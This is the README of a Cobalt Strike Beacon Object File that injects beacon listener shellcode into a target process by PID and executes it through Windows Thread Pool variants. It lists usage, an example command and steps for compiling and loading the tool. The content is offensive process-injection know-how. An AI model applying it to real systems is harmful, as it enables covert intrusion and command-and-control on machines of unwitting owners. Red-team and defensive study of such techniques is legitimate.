# InjectPoolParty
Inject listener shellcode in a specified process and execute it via [Windows Thread Pools](https://github.com/SafeBreach-Labs/PoolParty/). The following execution variants are supported: TP_TIMER (variant 8) | TP_DIRECT (variant 7) | TP_WORK (variant 2). 

>The following beacon shellcode configuration is injected: x64, process, indirect. This can be changed in the .cna script.

## Arguments
* `<variant>`: Windows Thread Pool execution variant: `TP_TIMER` | `TP_DIRECT` | `TP_WORK` (susceptible to slow execution time).
* `<pid>`: Process ID of the target process.
* `<listener>`: Beacon listener name.
	

## Usage
* `injectpoolparty <variant> <pid> <listener>`


## Example
* `injectpoolparty TP_TIMER 1234 Shorthaul-HTTPS`


## Compile
- 1\. Make sure Visual Studio is installed and supports C/C++.
- 2\. Open the `x64 Native Tools Command Prompt for VS <2019/2022>` terminal.
- 3\. Run the `bofcompile.bat` script to compile the object file. 
- 4\. In Cobalt strike, use the script manager to load the .cna script to import the tool. 

## Acknowledgements
A round of virtual applause to SafeBreach-Labs! This tool is heavily based on the foundational insights and innovative approaches demonstrated in their [Windows Thread Pools](https://github.com/SafeBreach-Labs/PoolParty/) research project.